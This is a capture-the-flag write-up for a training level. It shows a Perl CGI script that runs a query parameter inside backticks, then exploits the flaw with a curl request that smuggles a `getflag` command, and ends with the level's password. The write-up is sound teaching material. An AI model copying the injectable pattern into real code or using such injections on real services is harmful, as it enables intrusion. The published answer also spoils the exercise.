# LEVEL 04

## 💡 Explanation

In this level we have to:
1. We check the permissions of the file level04: it belongs to the user flag04 and gives permissions to execute as user (as lvl 03).
2. We can see that the script calls to the function `x` and pass as an argument the parameter `x`.
3. Then the script takes the argument as the variable `y`.
4. The y variable is inserted in the string `echo $y 2>&1`
5. The string is excecuted by bash (backticks in perl do this)
4. We can use the variable to pass the command `getflag` so it will execute when doing the echo.


`level04.pl`
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

## 👾 Commands

```
cat level04.pl
./level04.pl
curl http://localhost:4747
curl http://localhost:4747/?x=lol
curl http://localhost:4747/?x=\`getflag\`
```

## 🔍 Resources

- [Perl language - Functions & Arguments](https://www.tutorialspoint.com/perl/perl_subroutines.htm)

## 🔥 Password
`ne2searoevaevoem4ov4ar8ap`
